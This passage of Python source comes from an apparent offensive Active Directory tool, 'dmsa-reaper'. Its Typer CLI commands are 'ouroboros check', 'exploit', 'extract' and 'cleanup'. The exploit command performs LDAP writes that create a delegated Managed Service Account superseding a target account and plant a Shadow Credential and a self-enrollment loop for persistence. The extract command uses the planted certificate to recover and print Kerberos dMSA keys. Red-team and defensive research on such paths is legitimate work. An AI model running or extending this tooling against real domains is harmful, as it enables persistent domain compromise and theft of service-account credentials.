        raise typer.Exit(code=1)


@ouroboros_app.command("check")
def ouroboros_check_cmd(
    domain: str = typer.Option(..., "--domain", "-d", help="Target domain FQDN."),
    dc_ip: Optional[str] = _OPT_DC_IP,
    dc_host: Optional[str] = _OPT_DC_HOST,
    username: Optional[str] = _OPT_USER,
    password: Optional[str] = _OPT_PASS,
    kerberos: bool = _OPT_KRB,
    use_ldaps: bool = _OPT_LDAPS,
    start_tls: bool = _OPT_STARTTLS,
    target_account: Optional[str] = typer.Option(
        None,
        "--target-account",
        help="Limit capability analysis to one account by SAM, SID, or DN.",
    ),
    container_dn: Optional[str] = typer.Option(
        None,
        "--container-dn",
        help="Limit capability analysis to one creation container.",
    ),
    json_out: Optional[Path] = typer.Option(None, "--json"),
) -> None:
    """Find Ouroboros-capable paths and already planted persistence."""
    if kerberos and not username:
        raise typer.BadParameter(
            "Kerberos checking requires --username for SID and group resolution"
        )
    state = run_live_map(
        _make_ldap_config(
            domain,
            dc_ip,
            dc_host,
            username,
            password,
            kerberos,
            use_ldaps,
            start_tls,
        ),
        sdflags=DEFAULT_SD_FLAGS,
        target_filter=(
            _exact_target_filter(target_account) if target_account else None
        ),
    )
    paths = classify_ouroboros_paths(state)
    if container_dn:
        paths = [
            path
            for path in paths
            if (path.container_dn or "").lower() == container_dn.lower()
        ]
    findings = active_ouroboros_findings(state)

    capability = state.environment.dmsa_capable_status.value
    print(
        Panel(
            f"dMSA capability: [bold]{capability}[/bold]\n"
            f"Ouroboros-capable paths: [bold]{len(paths)}[/bold]\n"
            f"Existing persistence indicators: [bold]{len(findings)}[/bold]",
            title="Ouroboros assessment",
            expand=False,
        )
    )
    if paths:
        print_paths(paths)
    else:
        print("[green][+] No Ouroboros-capable delegated path was mapped.[/green]")
    if findings:
        table = Table(title="Existing Ouroboros indicators")
        table.add_column("Status")
        table.add_column("dMSA")
        table.add_column("Shadow creds")
        table.add_column("Self-authorized")
        table.add_column("Target")
        for finding in findings:
            table.add_row(
                str(finding["status"]),
                str(finding["sam"] or finding["dn"]),
                str(finding["key_credential_count"]),
                str(finding["self_authorized"]).lower(),
                str(finding["target_dn"] or "-"),
            )
        print(table)
    if json_out:
        _write_json(
            json_out,
            {
                "environment": state.environment.model_dump(mode="json"),
                "paths": [path.model_dump(mode="json") for path in paths],
                "findings": findings,
            },
        )
        print(f"[green][+] Assessment written:[/green] {json_out}")


@ouroboros_app.command("exploit")
def ouroboros_exploit_cmd(
    target_account: str = typer.Option(
        ...,
        "--target-account",
        help="Service account to supersede: SAM, SID, or DN.",
    ),
    domain: str = typer.Option(..., "--domain", "-d", help="Target domain FQDN."),
    dc_ip: Optional[str] = _OPT_DC_IP,
    dc_host: Optional[str] = _OPT_DC_HOST,
    username: Optional[str] = _OPT_USER,
    password: Optional[str] = _OPT_PASS,
    kerberos: bool = _OPT_KRB,
    use_ldaps: bool = _OPT_LDAPS,
    start_tls: bool = _OPT_STARTTLS,
    container_dn: Optional[str] = typer.Option(
        None,
        "--container-dn",
        help="Container in which to create the dMSA; also disambiguates paths.",
    ),
    path_id: Optional[str] = typer.Option(
        None,
        "--path",
        help="Ouroboros path ID from 'ouroboros check'.",
    ),
    dmsa_name: Optional[str] = typer.Option(
        None,
        "--dmsa-name",
        help="CN prefix for the new dMSA.",
    ),
    confirm: bool = typer.Option(False, "--confirm", help="Perform LDAP writes."),
    dry_run: bool = typer.Option(False, "--dry-run", help="Print planned writes."),
    cleanup_policy: str = typer.Option(
        "on-failure",
        "--cleanup-policy",
        help="Partial-failure cleanup: on-failure or manual.",
    ),
    ops_dir: Optional[Path] = typer.Option(None, "--ops-dir"),
    json_out: Optional[Path] = typer.Option(None, "--json"),
) -> None:
    """Create the mutual links, Shadow Credential, and self-enrollment loop."""
    if confirm == dry_run:
        raise typer.BadParameter("choose exactly one of --confirm or --dry-run")
    if cleanup_policy not in {"on-failure", "manual"}:
        raise typer.BadParameter("--cleanup-policy must be on-failure or manual")
    if kerberos and not username:
        raise typer.BadParameter(
            "Kerberos exploitation requires --username for execution binding"
        )
    configure_ops_dir(ops_dir)
    state = run_live_map(
        _make_ldap_config(
            domain,
            dc_ip,
            dc_host,
            username,
            password,
            kerberos,
            use_ldaps,
            start_tls,
        ),
        sdflags=DEFAULT_SD_FLAGS,
        target_filter=_exact_target_filter(target_account),
    )
    if not state.targets:
        raise typer.BadParameter(f"target not found: {target_account}")
    candidates = classify_ouroboros_paths(state)
    if container_dn:
        candidates = [
            path
            for path in candidates
            if (path.container_dn or "").lower() == container_dn.lower()
        ]
    if path_id:
        candidates = [path for path in candidates if path.id == path_id]
    if len(candidates) != 1:
        if candidates:
            print_paths(candidates)
        if not candidates:
            raise typer.BadParameter(
                f"no Ouroboros-capable path found for {target_account!r}"
            )
        raise typer.BadParameter(
            f"{len(candidates)} Ouroboros paths found; narrow with --path or --container-dn"
        )

    selected = candidates[0]
    primitive = get_primitives()["ouroboros"]
    effective_target = selected.target_dn
    effective_container = selected.container_dn
    if not effective_target or not effective_container:
        raise typer.BadParameter("selected Ouroboros path is missing target or container")
    writable_attrs = _target_writable_attrs(
        state,
        effective_target,
        primitive.name,
        None,
    )
    try:
        warnings = [
            *selected.environment_warnings,
            *primitive.preflight(
                selected,
                target_dn=effective_target,
                container_dn=effective_container,
            ),
        ]
    except Exception as exc:
        raise typer.BadParameter(f"preflight failed: {exc}") from exc
    for warning in dict.fromkeys(warnings):
        print(f"[yellow][!] {warning}[/yellow]")

    if dry_run:
        preview = Operation(
            id="DRY-RUN",
            primitive="ouroboros",
            path_id=selected.id,
            metadata={"path": selected.model_dump(mode="json")},
        )
        _populate_operation(
            preview,
            state=state,
            target_dn=effective_target,
            container_dn=effective_container,
            chain=None,
            dmsa_name=dmsa_name,
            target_writable_attrs=writable_attrs,
            allow_broad_dacl=False,
            dc_host=dc_host,
            dc_ip=dc_ip,
        )
        steps = primitive.dry_run_steps(preview)
        if json_out:
            _write_json(
                json_out,
                {
                    "operation": preview.model_dump(mode="json"),
                    "steps": steps,
                    "ldap_writes_performed": False,
                },
            )
        print(
            Panel(
                "\n".join(steps),
                title="[yellow]dry run[/yellow] Ouroboros",
                subtitle="No LDAP writes were made",
                expand=False,
            )
        )
        return

    _require_container_right(
        state,
        effective_container,
        _CREATE_CHILD_RIGHTS,
        "CreateChild:dMSA",
    )
    conn = bind(
        _make_ldap_config(
            domain,
            dc_ip,
            dc_host,
            username,
            password,
            kerberos,
            use_ldaps,
            start_tls,
        )
    )
    execution_identity = _validate_execution_binding(
        conn=conn,
        state=state,
        username=username,
        kerberos=kerberos,
        dc_host=dc_host,
        dc_ip=dc_ip,
    )
    validated_guids = _revalidate_mapped_guids(
        conn=conn,
        state=state,
        dns=[effective_container, effective_target],
    )
    operation = primitive.plan(selected)
    _populate_operation(
        operation,
        state=state,
        target_dn=effective_target,
        container_dn=effective_container,
        chain=None,
        dmsa_name=dmsa_name,
        target_writable_attrs=writable_attrs,
        allow_broad_dacl=False,
        dc_host=dc_host,
        dc_ip=dc_ip,
    )
    operation.metadata["runs_dir"] = str(get_ops_dir().parent / "runs")
    operation.metadata["execution_identity"] = execution_identity
    operation.metadata["validated_object_guids"] = validated_guids
    save_operation(operation)
    print(f"[*] Operation: {operation.id}")
    try:
        operation = primitive.execute(operation, confirm=True, conn=conn)
    except Exception:
        if cleanup_policy == "on-failure":
            operation = cleanup_operation(operation, conn=conn)
            save_operation(operation)
            print(f"[yellow][!] Automatic cleanup: {operation.status}[/yellow]")
        raise
    save_operation(operation)
    if json_out:
        _write_json(json_out, operation.model_dump(mode="json"))
    ouroboros_meta = operation.metadata.get("ouroboros") or {}
    print(
        Panel(
            f"[bold]dMSA[/bold]      {operation.metadata.get('created_dmsa_sam')}\n"
            f"[bold]Target[/bold]    {effective_target}\n"
            f"[bold]PFX[/bold]       {ouroboros_meta.get('pfx_path')}\n\n"
            f"Extract: dmsa-reaper ouroboros extract --op {operation.id}\n"
            f"Cleanup: dmsa-reaper ouroboros cleanup --op {operation.id}",
            title="[green]Ouroboros established[/green]",
            subtitle=f"operation {operation.id}",
            expand=False,
        )
    )


@ouroboros_app.command("extract")
def ouroboros_extract_cmd(
    op_id: str = typer.Option(..., "--op", help="Active Ouroboros operation ID."),
    domain: Optional[str] = typer.Option(None, "--domain", "-d"),
    dc_ip: Optional[str] = typer.Option(None, "--dc-ip", help="KDC IP or hostname."),
    ops_dir: Optional[Path] = typer.Option(None, "--ops-dir"),
    json_out: Optional[Path] = typer.Option(None, "--json"),
) -> None:
    """Authenticate with the planted certificate and recover the KDC key package."""
    configure_ops_dir(ops_dir)
    operation = load_operation(op_id)
    try:
        result = extract_ouroboros_credentials(
            operation,
            domain=domain,
            dc=dc_ip,
        )
    except OuroborosExtractionError as exc:
        raise typer.BadParameter(str(exc)) from exc
    operation.metadata.setdefault("ouroboros_extractions", []).append(
        {
            "status": result["status"],
            "extracted_at": result["extracted_at"],
            "artifact": result["artifact"],
            "current_key_count": len(result["current_keys"]),
            "previous_key_count": len(result["previous_keys"]),
        }
    )
    save_operation(operation)
    if json_out:
        secure_write_json(json_out, result)
    print("[green][+] KERB-DMSA-KEY-PACKAGE extracted[/green]")
    for key in result["current_keys"]:
        print(f"[*] dMSA current {key['enctype']}: {key['value']}")
    for key in result["previous_keys"]:
        print(f"[*] Previous {key['enctype']}: {key['value']}")
    print(f"[*] Protected artifact: {result['artifact']}")


@ouroboros_app.command("cleanup")
def ouroboros_cleanup_cmd(
    op_id: str = typer.Option(..., "--op", help="Ouroboros operation ID."),
    domain: Optional[str] = typer.Option(None, "--domain", "-d"),
    dc_ip: Optional[str] = _OPT_DC_IP,
    dc_host: Optional[str] = _OPT_DC_HOST,
    username: Optional[str] = _OPT_USER,
    password: Optional[str] = _OPT_PASS,
    kerberos: bool = _OPT_KRB,
    use_ldaps: bool = _OPT_LDAPS,
    start_tls: bool = _OPT_STARTTLS,
    ops_dir: Optional[Path] = typer.Option(None, "--ops-dir"),
    json_out: Optional[Path] = typer.Option(None, "--json"),
) -> None:
    """Delete the GUID-matched dMSA and restore target-side values."""
    configure_ops_dir(ops_dir)
    operation = load_operation(op_id)
    if operation.primitive != "ouroboros":
        raise typer.BadParameter("operation is not an Ouroboros operation")
    if not (operation.cleaned_up and operation.cleanup_verified):
        effective_domain = domain or operation.metadata.get("domain") or ""
        effective_dc_ip = dc_ip or operation.metadata.get("dc_ip")
        effective_dc_host = dc_host or operation.metadata.get("dc_host")
        if not effective_domain and not effective_dc_ip and not effective_dc_host:
            raise typer.BadParameter("--domain, --dc-ip, or --dc-host is required")
        conn = bind(
            _make_ldap_config(
                str(effective_domain),
                effective_dc_ip,
                effective_dc_host,
                username,
                password,
                kerberos,
                use_ldaps,
                start_tls,
            )
        )
        operation = cleanup_operation(operation, conn=conn)
        save_operation(operation)
    cleanup = operation.metadata.get("cleanup") or {}
    payload = {
        "operation_id": operation.id,
        "status": operation.status,
        "cleanup_verified": operation.cleanup_verified,
        "ouroboros_persistence_removed": cleanup.get(
            "ouroboros_persistence_removed", False
        ),
        "cleanup": cleanup,
    }
    artifact = get_ops_dir().parent / "runs" / operation.id / "ouroboros-cleanup.json"
    _write_json(artifact, payload)
    artifact.chmod(0o600)
    if json_out:
        _write_json(json_out, payload)
    if payload["ouroboros_persistence_removed"]:
        print("[green][+] GUID-matched Ouroboros dMSA removed[/green]")
    for conflict in cleanup.get("conflicts", []):
        print(f"[red][-] {conflict.get('dn')}: {conflict.get('reason')}[/red]")
    for error in cleanup.get("errors", []):
        print(f"[red][-] {error.get('dn')}: {error.get('reason')}[/red]")
    print(
        f"[green][+] Cleanup:[/green] {operation.status} "
        f"(checked={str(operation.cleanup_verified).lower()})"
    )
    if not operation.cleanup_verified:
        raise typer.Exit(code=1)


if __name__ == "__main__":
    app()
